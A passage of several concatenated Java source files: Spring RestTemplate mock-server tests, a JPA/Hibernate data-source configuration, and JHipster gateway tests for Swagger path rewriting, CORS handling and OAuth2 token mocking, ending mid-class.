	@Test // SPR-14694
	public void repeatedAccessToResponseViaResource() {

		Resource resource = new ClassPathResource("ludwig.json", this.getClass());

		RestTemplate restTemplate = new RestTemplate();
		restTemplate.setInterceptors(Collections.singletonList(new ContentInterceptor(resource)));

		MockRestServiceServer mockServer = MockRestServiceServer.bindTo(restTemplate)
				.ignoreExpectOrder(true)
				.bufferContent()  // enable repeated reads of response body
				.build();

		mockServer.expect(requestTo("/composers/42")).andExpect(method(HttpMethod.GET))
				.andRespond(withSuccess(resource, MediaType.APPLICATION_JSON));

		restTemplate.getForObject("/composers/{id}", Person.class, 42);

		mockServer.verify();
	}
	
	@Test
	public void expectNeverViolated() {

		String responseBody = "{\"name\" : \"Ludwig van Beethoven\", \"someDouble\" : \"1.6035\"}";

		this.mockServer.expect(once(), requestTo("/composers/42")).andExpect(method(HttpMethod.GET))
				.andRespond(withSuccess(responseBody, MediaType.APPLICATION_JSON));
		this.mockServer.expect(never(), requestTo("/composers/43")).andExpect(method(HttpMethod.GET))
				.andRespond(withSuccess(responseBody, MediaType.APPLICATION_JSON));

		this.restTemplate.getForObject("/composers/{id}", Person.class, 42);
		assertThatExceptionOfType(AssertionError.class).isThrownBy(() ->
				this.restTemplate.getForObject("/composers/{id}", Person.class, 43));
	}
--------------------------------------------------------------------------------------------------------
spring.jpa.properties.hibernate.jdbc.lob.non_contextual_creation=true
 
/*
 * The MIT License
 *
 * Copyright 2017 WildBees Labs.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */
package com.wildbeeslabs.api.rest.subscription.configuration;

import com.mchange.v2.c3p0.ComboPooledDataSource;
import com.wildbeeslabs.api.rest.common.service.interfaces.IPropertiesConfiguration;

import java.util.Properties;
import javax.naming.NamingException;
import javax.persistence.EntityManagerFactory;
import javax.sql.DataSource;
import java.beans.PropertyVetoException;

import org.hibernate.SessionFactory;
import com.zaxxer.hikari.HikariDataSource;

import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.autoconfigure.jdbc.DataSourceBuilder;
import org.springframework.boot.autoconfigure.jdbc.DataSourceProperties;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Primary;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.orm.jpa.JpaTransactionManager;
import org.springframework.orm.jpa.JpaVendorAdapter;
import org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean;
import org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter;
import org.springframework.transaction.PlatformTransactionManager;
import org.springframework.transaction.annotation.EnableTransactionManagement;
import org.springframework.beans.factory.FactoryBean;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.beans.factory.config.BeanPostProcessor;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.context.support.PropertySourcesPlaceholderConfigurer;
import org.springframework.dao.annotation.PersistenceExceptionTranslationPostProcessor;
import org.springframework.data.jpa.repository.config.EnableJpaAuditing;
import org.springframework.orm.hibernate5.LocalSessionFactoryBean;
import org.springframework.orm.jpa.persistenceunit.DefaultPersistenceUnitManager;
import org.springframework.orm.jpa.persistenceunit.PersistenceUnitManager;
import org.springframework.orm.jpa.support.PersistenceAnnotationBeanPostProcessor;
import org.springframework.scheduling.annotation.EnableAsync;
import org.springframework.jdbc.datasource.DriverManagerDataSource;

/**
 *
 * Application JPA Configuration
 *
 * @author Alex
 * @version 1.0.0
 * @since 2017-08-08
 */
@Configuration("subscriptionJpaConfiguration")
@EnableAutoConfiguration
@EnableAsync
@EnableJpaAuditing
@EnableTransactionManagement
@EnableJpaRepositories(basePackages = {"com.wildbeeslabs.api.rest.subscription.repository"},
        entityManagerFactoryRef = "entityManagerFactory",
        transactionManagerRef = "transactionManager")
//@ImportResource("classpath:hibernate.cfg.xml")
//@PropertySource({"classpath:application.default.yml"})
public class JpaConfiguration {

//    @PersistenceContext(unitName = "ds2", type = PersistenceContextType.TRANSACTION)
//    private EntityManager em;
    @Autowired
    @Qualifier("subscriptionPropertiesConfiguration")
    private IPropertiesConfiguration propertyConfig;

    /**
     * Get Property Source placeholder
     *
     * @return property source placeholder
     */
    @Bean
    public static PropertySourcesPlaceholderConfigurer propertySourcesPlaceholderConfigurer() {
        return new PropertySourcesPlaceholderConfigurer();
    }

    /**
     * Get Default DataSource properties
     *
     * @return default DataSource properties
     */
    @Bean
    @Primary
    @ConfigurationProperties(ignoreInvalidFields = true, prefix = "datasource.subscriptionapp")
    public DataSourceProperties dataSourceProperties() {
        return new DataSourceProperties();
    }

    /**
     * Get DataSource configuration
     *
     * @return DataSource configuration
     */
    @Bean
    public DataSource dataSource() {
        final DataSourceProperties dataSourceProperties = dataSourceProperties();
        HikariDataSource dataSource = (HikariDataSource) DataSourceBuilder
                .create(dataSourceProperties.getClassLoader())
                .driverClassName(dataSourceProperties.getDriverClassName())
                .url(dataSourceProperties.getUrl())
                .username(dataSourceProperties.getUsername())
                .password(dataSourceProperties.getPassword())
                .type(HikariDataSource.class)
                .build();
        // Basic datasource properties
        //dataSource.setAllowPoolSuspension(propertyConfig.getProperty("datasource.subscriptionapp.allowPoolSuspension", Boolean.class));
        //dataSource.setAutoCommit(propertyConfig.getProperty("datasource.subscriptionapp.autoCommit", Boolean.class));
        //dataSource.setMaximumPoolSize(propertyConfig.getProperty("datasource.subscriptionapp.maxPoolSize", Integer.class));
        // MySQL specific properties
        /*dataSource.addDataSourceProperty("cachePrepStmts", propertyConfig.getProperty("datasource.subscriptionapp.cachePrepStmts"));
        dataSource.addDataSourceProperty("prepStmtCacheSize", propertyConfig.getProperty("datasource.subscriptionapp.prepStmtCacheSize"));
        dataSource.addDataSourceProperty("prepStmtCacheSqlLimit", propertyConfig.getProperty("datasource.subscriptionapp.prepStmtCacheSqlLimit"));
        dataSource.addDataSourceProperty("useServerPrepStmts", propertyConfig.getProperty("datasource.subscriptionapp.useServerPrepStmts"));
        dataSource.addDataSourceProperty("useLocalSessionState", propertyConfig.getProperty("datasource.subscriptionapp.useLocalSessionState"));
        dataSource.addDataSourceProperty("useLocalTransactionState", propertyConfig.getProperty("datasource.subscriptionapp.useLocalTransactionState"));
        dataSource.addDataSourceProperty("rewriteBatchedStatements", propertyConfig.getProperty("datasource.subscriptionapp.rewriteBatchedStatements"));
        dataSource.addDataSourceProperty("cacheResultSetMetadata", propertyConfig.getProperty("datasource.subscriptionapp.cacheResultSetMetadata"));
        dataSource.addDataSourceProperty("cacheServerConfiguration", propertyConfig.getProperty("datasource.subscriptionapp.cacheServerConfiguration"));
        dataSource.addDataSourceProperty("elideSetAutoCommits", propertyConfig.getProperty("datasource.subscriptionapp.elideSetAutoCommits"));
        dataSource.addDataSourceProperty("maintainTimeStats", propertyConfig.getProperty("datasource.subscriptionapp.maintainTimeStats"));
        dataSource.addDataSourceProperty("allowUrlInLocalInfile", propertyConfig.getProperty("datasource.subscriptionapp.allowUrlInLocalInfile"));
        dataSource.addDataSourceProperty("useReadAheadInput", propertyConfig.getProperty("datasource.subscriptionapp.useReadAheadInput"));
        dataSource.addDataSourceProperty("useUnbufferedIO", propertyConfig.getProperty("datasource.subscriptionapp.useUnbufferedIO"));*/
        return dataSource;
    }

    /**
     * Get Combo pool DataSource configuration
     *
     * @return DataSource configuration
     * @throws java.beans.PropertyVetoException
     */
    //@Bean
    public DataSource dataSource2() throws PropertyVetoException {
        final ComboPooledDataSource dataSource2 = new ComboPooledDataSource();
        dataSource2.setAcquireIncrement(propertyConfig.getProperty("datasource.subscriptionapp.acquireIncrement", Integer.class));
        dataSource2.setMaxStatementsPerConnection(propertyConfig.getProperty("datasource.subscriptionapp.maxStatementsPerConnection", Integer.class));
        dataSource2.setMaxStatements(propertyConfig.getProperty("datasource.subscriptionapp.maxStatements", Integer.class));
        dataSource2.setMaxPoolSize(propertyConfig.getProperty("datasource.subscriptionapp.maxPoolSize", Integer.class));
        dataSource2.setMinPoolSize(propertyConfig.getProperty("datasource.subscriptionapp.minPoolSize", Integer.class));
        dataSource2.setJdbcUrl(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.url"));
        dataSource2.setUser(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.username"));
        dataSource2.setPassword(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.password"));
        dataSource2.setDriverClass(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.driverClassName"));
        return dataSource2;
    }

    /**
     * Get DataSource configuration
     *
     * @return DataSource configuration
     * @throws java.beans.PropertyVetoException
     */
    //@Bean
    public DataSource dataSource3() throws PropertyVetoException {
        final DriverManagerDataSource dataSource = new DriverManagerDataSource();
        dataSource.setDriverClassName(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.driverClassName"));
        dataSource.setUrl(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.url"));
        dataSource.setUsername(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.username"));
        dataSource.setPassword(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.password"));
        return dataSource;
    }

    /**
     * Get Entity Manager Factory bean
     *
     * @return local container emf bean
     * @throws javax.naming.NamingException
     */
    @Bean
    public LocalContainerEntityManagerFactoryBean entityManagerFactory() throws NamingException {
        LocalContainerEntityManagerFactoryBean factoryBean = new LocalContainerEntityManagerFactoryBean();
        factoryBean.setDataSource(dataSource());
        factoryBean.setPackagesToScan(new String[]{"com.wildbeeslabs.api.rest.common.model", "com.wildbeeslabs.api.rest.subscription.model"});
        factoryBean.setJpaVendorAdapter(jpaVendorAdapter());
        factoryBean.setJpaProperties(jpaProperties());
        factoryBean.setPersistenceUnitName("local");
//        factoryBean.setPersistenceUnitManager(persistenceUnitManager());
        return factoryBean;
    }

    /**
     * Get Hibernate JPA adapter
     *
     * @return hibernate JPA adapter
     */
    @Bean
    public JpaVendorAdapter jpaVendorAdapter() {
        HibernateJpaVendorAdapter hibernateJpaVendorAdapter = new HibernateJpaVendorAdapter();
//        hibernateJpaVendorAdapter.setShowSql(true);
//        hibernateJpaVendorAdapter.setGenerateDdl(true);
//        hibernateJpaVendorAdapter.setDatabasePlatform(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.hibernate.dialect"));
        return hibernateJpaVendorAdapter;
    }

    /**
     * Get Persistence exception translation processor
     *
     * @return persistence exception translation processor
     */
    @Bean
    public PersistenceExceptionTranslationPostProcessor exceptionTranslation() {
        return new PersistenceExceptionTranslationPostProcessor();
    }

    /**
     * Get JPA properties configuration
     *
     * @return JPA properties configuration
     */
    private Properties jpaProperties() {
        final Properties properties = new Properties();
        properties.put("hibernate.dialect", propertyConfig.getMandatoryProperty("datasource.subscriptionapp.hibernate.dialect"));
        properties.put("hibernate.hbm2ddl.auto", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.hbm2ddl.method"));
        properties.put("hibernate.show_sql", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.showSql"));
        properties.put("hibernate.format_sql", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.formatSql"));
        properties.put("hibernate.max_fetch_depth", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.maxFetchDepth"));
        properties.put("hibernate.default_batch_fetch_size", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.defaultBatchFetchSize"));
        properties.put("hibernate.default_schema", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.defaultSchema"));
        properties.put("hibernate.globally_quoted_identifiers", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.globallyQuotedIdentifiers"));
        properties.put("hibernate.generate_statistics", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.generateStatistics"));
        properties.put("hibernate.bytecode.use_reflection_optimizer", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.bytecode.useReflectionOptimizer"));

        // Configure Lucene Search
        properties.put("spring.jpa.properties.hibernate.search.default.directory_provider", propertyConfig.getProperty("spring.jpa.properties.hibernate.search.default.directoryProvider"));
        properties.put("spring.jpa.properties.hibernate.search.default.indexBase", propertyConfig.getProperty("spring.jpa.properties.hibernate.search.default.indexBase"));
        properties.put("spring.jpa.properties.hibernate.search.default.batch.merge_factor", propertyConfig.getProperty("spring.jpa.properties.hibernate.search.default.batch.mergeFactor"));
        properties.put("spring.jpa.properties.hibernate.search.default.batch.max_buffered_docs", propertyConfig.getProperty("spring.jpa.properties.hibernate.search.default.batch.maxBufferedDocs"));

        if (StringUtils.isNotEmpty(propertyConfig.getProperty("datasource.subscriptionapp.hibernate.hbm2ddl.importFiles"))) {
            properties.put("hibernate.hbm2ddl.import_files", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.hbm2ddl.importFiles"));
        }

        // Configure Hibernate Cache
        properties.put("hibernate.cache.use_second_level_cache", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.cache.useSecondLevelCache"));
        properties.put("hibernate.cache.use_query_cache", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.cache.useQueryCache"));
        properties.put("hibernate.cache.region.factory_class", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.cache.region.factoryClass"));

        // Configure Connection Pool
        properties.put("hibernate.c3p0.min_size", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.c3p0.minSize"));
        properties.put("hibernate.c3p0.max_size", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.c3p0.maxSize"));
        properties.put("hibernate.c3p0.timeout", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.c3p0.timeout"));
        properties.put("hibernate.c3p0.max_statements", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.c3p0.maxStatements"));
        properties.put("hibernate.c3p0.idle_test_period", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.c3p0.idleTestPeriod"));
        return properties;
    }

    /**
     * Get Transaction Manager
     *
     * @param emf - entity manager factory
     * @return transaction manager
     */
    @Bean
    @Autowired
    public PlatformTransactionManager transactionManager(final EntityManagerFactory emf) {
        JpaTransactionManager txManager = new JpaTransactionManager();
        txManager.setEntityManagerFactory(emf);
        return txManager;
    }

    /**
     * Get Session Factory bean
     *
     * @return session factory bean
     */
    @Bean
    public FactoryBean<SessionFactory> sessionFactory() {
        LocalSessionFactoryBean sessionFactory = new LocalSessionFactoryBean();
        sessionFactory.setDataSource(dataSource());
        return sessionFactory;
    }

    /**
     * Get Persistence Unit Manager
     *
     * @return persistence unit manager
     */
    @Bean
    public PersistenceUnitManager persistenceUnitManager() {
        DefaultPersistenceUnitManager manager = new DefaultPersistenceUnitManager();
        manager.setDefaultDataSource(dataSource());
        return manager;
    }

    /**
     * Get Persistence Annotation processor
     *
     * @return persistence annotation processor
     */
    @Bean
    public BeanPostProcessor postProcessor() {
        PersistenceAnnotationBeanPostProcessor postProcessor = new PersistenceAnnotationBeanPostProcessor();
        return postProcessor;
    }
}

 
package com.baeldung.jhipster.gateway.gateway.responserewriting;

import com.netflix.zuul.context.RequestContext;
import org.apache.commons.io.IOUtils;
import org.junit.Test;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.zip.GZIPInputStream;

import static com.baeldung.jhipster.gateway.gateway.responserewriting.SwaggerBasePathRewritingFilter.gzipData;
import static org.junit.Assert.*;
import static springfox.documentation.swagger2.web.Swagger2Controller.DEFAULT_URL;

/**
 * Tests SwaggerBasePathRewritingFilter class.
 */
public class SwaggerBasePathRewritingFilterTest {

    private SwaggerBasePathRewritingFilter filter = new SwaggerBasePathRewritingFilter();

    @Test
    public void shouldFilter_on_default_swagger_url() {

        MockHttpServletRequest request = new MockHttpServletRequest("GET", DEFAULT_URL);
        RequestContext.getCurrentContext().setRequest(request);

        assertTrue(filter.shouldFilter());
    }

    /**
     * Zuul DebugFilter can be triggered by "deug" parameter.
     */
    @Test
    public void shouldFilter_on_default_swagger_url_with_param() {

        MockHttpServletRequest request = new MockHttpServletRequest("GET", DEFAULT_URL);
        request.setParameter("debug", "true");
        RequestContext.getCurrentContext().setRequest(request);

        assertTrue(filter.shouldFilter());
    }

    @Test
    public void shouldNotFilter_on_wrong_url() {

        MockHttpServletRequest request = new MockHttpServletRequest("GET", "/management/info");
        RequestContext.getCurrentContext().setRequest(request);

        assertFalse(filter.shouldFilter());
    }

    @Test
    public void run_on_valid_response() throws Exception {
        MockHttpServletRequest request = new MockHttpServletRequest("GET", "/service1" + DEFAULT_URL);
        RequestContext context = RequestContext.getCurrentContext();
        context.setRequest(request);

        MockHttpServletResponse response = new MockHttpServletResponse();
        context.setResponseGZipped(false);
        context.setResponse(response);

        InputStream in = IOUtils.toInputStream("{\"basePath\":\"/\"}", StandardCharsets.UTF_8);
        context.setResponseDataStream(in);

        filter.run();

        assertEquals("UTF-8", response.getCharacterEncoding());
        assertEquals("{\"basePath\":\"/service1\"}", context.getResponseBody());
    }

    @Test
    public void run_on_valid_response_gzip() throws Exception {
        MockHttpServletRequest request = new MockHttpServletRequest("GET", "/service1" + DEFAULT_URL);
        RequestContext context = RequestContext.getCurrentContext();
        context.setRequest(request);

        MockHttpServletResponse response = new MockHttpServletResponse();
        context.setResponseGZipped(true);
        context.setResponse(response);

        context.setResponseDataStream(new ByteArrayInputStream(gzipData("{\"basePath\":\"/\"}")));

        filter.run();

        assertEquals("UTF-8", response.getCharacterEncoding());

        InputStream responseDataStream = new GZIPInputStream(context.getResponseDataStream());
        String responseBody = IOUtils.toString(responseDataStream, StandardCharsets.UTF_8);
        assertEquals("{\"basePath\":\"/service1\"}", responseBody);
    }
}

 
 
package com.baeldung.jhipster.gateway.config;

import org.springframework.cloud.client.loadbalancer.RestTemplateCustomizer;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Primary;
import org.springframework.security.oauth2.provider.token.TokenStore;
import org.springframework.security.oauth2.provider.token.store.JwtAccessTokenConverter;
import org.springframework.web.client.RestTemplate;

/**
 * Overrides UAA specific beans, so they do not interfere the testing
 * This configuration must be included in @SpringBootTest in order to take effect.
 */
@Configuration
public class SecurityBeanOverrideConfiguration {

    @Bean
    @Primary
    public TokenStore tokenStore() {
        return null;
    }

    @Bean
    @Primary
    public JwtAccessTokenConverter jwtAccessTokenConverter() {
        return null;
    }

    @Bean
    @Primary
    public RestTemplate loadBalancedRestTemplate(RestTemplateCustomizer customizer) {
        return null;
    }
}

 
 
 
package com.baeldung.jhipster.gateway.config;

import com.codahale.metrics.MetricRegistry;
import com.codahale.metrics.servlet.InstrumentedFilter;
import com.codahale.metrics.servlets.MetricsServlet;
import io.github.jhipster.config.JHipsterConstants;
import io.github.jhipster.config.JHipsterProperties;
import io.github.jhipster.web.filter.CachingHttpHeadersFilter;
import io.undertow.Undertow;
import io.undertow.Undertow.Builder;
import io.undertow.UndertowOptions;
import org.apache.commons.io.FilenameUtils;

import org.h2.server.web.WebServlet;
import org.junit.Before;
import org.junit.Test;
import org.springframework.boot.web.embedded.undertow.UndertowServletWebServerFactory;
import org.springframework.http.HttpHeaders;
import org.springframework.mock.env.MockEnvironment;
import org.springframework.mock.web.MockServletContext;
import org.springframework.test.util.ReflectionTestUtils;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;
import org.xnio.OptionMap;

import javax.servlet.*;
import java.util.*;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.*;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.options;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * Unit tests for the WebConfigurer class.
 *
 * @see WebConfigurer
 */
public class WebConfigurerTest {

    private WebConfigurer webConfigurer;

    private MockServletContext servletContext;

    private MockEnvironment env;

    private JHipsterProperties props;

    private MetricRegistry metricRegistry;

    @Before
    public void setup() {
        servletContext = spy(new MockServletContext());
        doReturn(mock(FilterRegistration.Dynamic.class))
            .when(servletContext).addFilter(anyString(), any(Filter.class));
        doReturn(mock(ServletRegistration.Dynamic.class))
            .when(servletContext).addServlet(anyString(), any(Servlet.class));

        env = new MockEnvironment();
        props = new JHipsterProperties();

        webConfigurer = new WebConfigurer(env, props);
        metricRegistry = new MetricRegistry();
        webConfigurer.setMetricRegistry(metricRegistry);
    }

    @Test
    public void testStartUpProdServletContext() throws ServletException {
        env.setActiveProfiles(JHipsterConstants.SPRING_PROFILE_PRODUCTION);
        webConfigurer.onStartup(servletContext);

        assertThat(servletContext.getAttribute(InstrumentedFilter.REGISTRY_ATTRIBUTE)).isEqualTo(metricRegistry);
        assertThat(servletContext.getAttribute(MetricsServlet.METRICS_REGISTRY)).isEqualTo(metricRegistry);
        verify(servletContext).addFilter(eq("webappMetricsFilter"), any(InstrumentedFilter.class));
        verify(servletContext).addServlet(eq("metricsServlet"), any(MetricsServlet.class));
        verify(servletContext).addFilter(eq("cachingHttpHeadersFilter"), any(CachingHttpHeadersFilter.class));
        verify(servletContext, never()).addServlet(eq("H2Console"), any(WebServlet.class));
    }

    @Test
    public void testStartUpDevServletContext() throws ServletException {
        env.setActiveProfiles(JHipsterConstants.SPRING_PROFILE_DEVELOPMENT);
        webConfigurer.onStartup(servletContext);

        assertThat(servletContext.getAttribute(InstrumentedFilter.REGISTRY_ATTRIBUTE)).isEqualTo(metricRegistry);
        assertThat(servletContext.getAttribute(MetricsServlet.METRICS_REGISTRY)).isEqualTo(metricRegistry);
        verify(servletContext).addFilter(eq("webappMetricsFilter"), any(InstrumentedFilter.class));
        verify(servletContext).addServlet(eq("metricsServlet"), any(MetricsServlet.class));
        verify(servletContext, never()).addFilter(eq("cachingHttpHeadersFilter"), any(CachingHttpHeadersFilter.class));
        verify(servletContext).addServlet(eq("H2Console"), any(WebServlet.class));
    }

    @Test
    public void testCustomizeServletContainer() {
        env.setActiveProfiles(JHipsterConstants.SPRING_PROFILE_PRODUCTION);
        UndertowServletWebServerFactory container = new UndertowServletWebServerFactory();
        webConfigurer.customize(container);
        assertThat(container.getMimeMappings().get("abs")).isEqualTo("audio/x-mpeg");
        assertThat(container.getMimeMappings().get("html")).isEqualTo("text/html;charset=utf-8");
        assertThat(container.getMimeMappings().get("json")).isEqualTo("text/html;charset=utf-8");
        if (container.getDocumentRoot() != null) {
            assertThat(container.getDocumentRoot().getPath()).isEqualTo(FilenameUtils.separatorsToSystem("target/www"));
        }

        Builder builder = Undertow.builder();
        container.getBuilderCustomizers().forEach(c -> c.customize(builder));
        OptionMap.Builder serverOptions = (OptionMap.Builder) ReflectionTestUtils.getField(builder, "serverOptions");
        assertThat(serverOptions.getMap().get(UndertowOptions.ENABLE_HTTP2)).isNull();
    }

    @Test
    public void testUndertowHttp2Enabled() {
        props.getHttp().setVersion(JHipsterProperties.Http.Version.V_2_0);
        UndertowServletWebServerFactory container = new UndertowServletWebServerFactory();
        webConfigurer.customize(container);
        Builder builder = Undertow.builder();
        container.getBuilderCustomizers().forEach(c -> c.customize(builder));
        OptionMap.Builder serverOptions = (OptionMap.Builder) ReflectionTestUtils.getField(builder, "serverOptions");
        assertThat(serverOptions.getMap().get(UndertowOptions.ENABLE_HTTP2)).isTrue();
    }

    @Test
    public void testCorsFilterOnApiPath() throws Exception {
        props.getCors().setAllowedOrigins(Collections.singletonList("*"));
        props.getCors().setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE"));
        props.getCors().setAllowedHeaders(Collections.singletonList("*"));
        props.getCors().setMaxAge(1800L);
        props.getCors().setAllowCredentials(true);

        MockMvc mockMvc = MockMvcBuilders.standaloneSetup(new WebConfigurerTestController())
            .addFilters(webConfigurer.corsFilter())
            .build();

        mockMvc.perform(
            options("/api/test-cors")
                .header(HttpHeaders.ORIGIN, "other.domain.com")
                .header(HttpHeaders.ACCESS_CONTROL_REQUEST_METHOD, "POST"))
            .andExpect(status().isOk())
            .andExpect(header().string(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN, "other.domain.com"))
            .andExpect(header().string(HttpHeaders.VARY, "Origin"))
            .andExpect(header().string(HttpHeaders.ACCESS_CONTROL_ALLOW_METHODS, "GET,POST,PUT,DELETE"))
            .andExpect(header().string(HttpHeaders.ACCESS_CONTROL_ALLOW_CREDENTIALS, "true"))
            .andExpect(header().string(HttpHeaders.ACCESS_CONTROL_MAX_AGE, "1800"));

        mockMvc.perform(
            get("/api/test-cors")
                .header(HttpHeaders.ORIGIN, "other.domain.com"))
            .andExpect(status().isOk())
            .andExpect(header().string(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN, "other.domain.com"));
    }

    @Test
    public void testCorsFilterOnOtherPath() throws Exception {
        props.getCors().setAllowedOrigins(Collections.singletonList("*"));
        props.getCors().setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE"));
        props.getCors().setAllowedHeaders(Collections.singletonList("*"));
        props.getCors().setMaxAge(1800L);
        props.getCors().setAllowCredentials(true);

        MockMvc mockMvc = MockMvcBuilders.standaloneSetup(new WebConfigurerTestController())
            .addFilters(webConfigurer.corsFilter())
            .build();

        mockMvc.perform(
            get("/test/test-cors")
                .header(HttpHeaders.ORIGIN, "other.domain.com"))
            .andExpect(status().isOk())
            .andExpect(header().doesNotExist(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN));
    }

    @Test
    public void testCorsFilterDeactivated() throws Exception {
        props.getCors().setAllowedOrigins(null);

        MockMvc mockMvc = MockMvcBuilders.standaloneSetup(new WebConfigurerTestController())
            .addFilters(webConfigurer.corsFilter())
            .build();

        mockMvc.perform(
            get("/api/test-cors")
                .header(HttpHeaders.ORIGIN, "other.domain.com"))
            .andExpect(status().isOk())
            .andExpect(header().doesNotExist(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN));
    }

    @Test
    public void testCorsFilterDeactivated2() throws Exception {
        props.getCors().setAllowedOrigins(new ArrayList<>());

        MockMvc mockMvc = MockMvcBuilders.standaloneSetup(new WebConfigurerTestController())
            .addFilters(webConfigurer.corsFilter())
            .build();

        mockMvc.perform(
            get("/api/test-cors")
                .header(HttpHeaders.ORIGIN, "other.domain.com"))
            .andExpect(status().isOk())
            .andExpect(header().doesNotExist(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN));
    }
}

 
 
 
 
package com.baeldung.jhipster.gateway.security;

import org.springframework.boot.test.mock.mockito.MockBean;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.User;
import org.springframework.security.oauth2.common.DefaultOAuth2AccessToken;
import org.springframework.security.oauth2.provider.OAuth2Authentication;
import org.springframework.security.oauth2.provider.OAuth2Request;
import org.springframework.security.oauth2.provider.token.ResourceServerTokenServices;
import org.springframework.stereotype.Component;
import org.springframework.test.web.servlet.request.RequestPostProcessor;

import java.util.Collections;
import java.util.List;
import java.util.Set;
import java.util.UUID;
import java.util.stream.Collectors;

import static org.mockito.BDDMockito.given;

/**
 * A bean providing simple mocking of OAuth2 access tokens for security integration tests.
 */
@Component
public class OAuth2TokenMockUtil {

    @MockBean
    private ResourceServerTokenServices tokenServices;

    private OAuth2Authentication createAuthentication(String username, Set<String> scopes, Set<String> roles) {
        List<GrantedAuthority> authorities = roles.stream()
            .map(SimpleGrantedAuthority::new)
            .collect(Collectors.toList());

        User principal = new User(username, "test", true, true, true, true, authorities);
        Authentication authentication = new UsernamePasswordAuthenticationToken(principal, principal.getPassword(),
            principal.getAuthorities());

        // Create the authorization request and OAuth2Authentication object
        OAuth2Request authRequest = new OAuth2Request(null, "testClient", null, true, scopes, null, null, null,
            null);
        return new OAuth2Authentication(authRequest, authentication);
    }

    public RequestPostProcessor oauth2Authentication(String username, Set<String> scopes, Set<String> roles) {
        String uuid = String.valueOf(UUID.randomUUID());

        given(tokenServices.loadAuthentication(uuid))
            .willReturn(createAuthentication(username, scopes, roles));

        given(tokenServices.readAccessToken(uuid)).willReturn(new DefaultOAuth2AccessToken(uuid));

        return new OAuth2PostProcessor(uuid);
    }

    public RequestPostProcessor oauth2Authentication(String username, Set<String> scopes) {
        return oauth2Authentication(username, scopes, Collections.emptySet());
    }

    public RequestPostProcessor oauth2Authentication(String username) {
        return oauth2Authentication(username, Collections.emptySet());
    }

    public static class OAuth2PostProcessor implements RequestPostProcessor {

        private String token;

        public OAuth2PostProcessor(String token) {
            this.token = token;
        }

        @Override
